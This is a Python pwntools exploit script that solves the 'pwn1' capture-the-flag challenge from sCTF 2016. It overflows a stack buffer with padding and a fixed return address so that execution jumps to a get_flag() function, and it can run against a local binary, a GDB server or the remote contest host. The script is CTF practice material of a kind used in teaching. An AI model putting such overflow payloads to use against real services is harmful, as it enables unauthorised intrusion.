#!/usr/bin/env python
import sys
from pwn import *

####################################################
##################### EXPLOIT ######################
####################################################
#CHANGE THESE PARAMS
FILE 	= './pwn1'
HOST 	= 'problems2.2016q1.sctf.io'
PORT 	= '1337'

GET_FLAG_MEM_ADDR = struct.pack('I', 0x08048F0D)

def getpayload():
	payload = ''
	#Offset
	payload += 'A'
	#Padding
	payload += 'I'*21
	#Memory address for get_flag() function
	payload += GET_FLAG_MEM_ADDR
	return payload


def pwn(p):
	payload = getpayload()
	p.sendline(payload)
	print(p.recv())



####################################################
##################### TEMPLATE #####################
####################################################
USAGE = """
Options:
\t[-n, --network]\tPerform attack on live (n)etwork (Default: local binary file)
\t[-g, --gdb]\t\tLaunch binary with GDB Server (Can not be used against a live network target)
		"""
GDBPORT = 4200

def launch_pwn(attack_network, gdb_server):
	p = None
	if attack_network:
		p = remote(HOST, PORT)
	else:
		fileparams = FILE
		if gdb_server:
			fileparams = ['/usr/bin/gdbserver', 'localhost:%d' % GDBPORT, FILE]
		p = process(fileparams)
	try:
		pwn(p)
	except e:
		#TODO, real exception handling or something
		print('Exception ocurred: %s' % str(e))
	p.clean_and_log()


def main():
	gdb_server = False
	attack_network = False
	for i in sys.argv:
		if i == '-g' or i == '--gdb':
			gdb_server = True
		elif i == '-n' or i == '--network':
			attack_network = True
		elif i == sys.argv[0]:
			pass
		else:
			usage()
			exit()

	launch_pwn(attack_network, gdb_server)


def usage():
	print('Usage ./%s [OPTIONS]%s' % (sys.argv[0], USAGE))


if __name__ == "__main__":
	main()
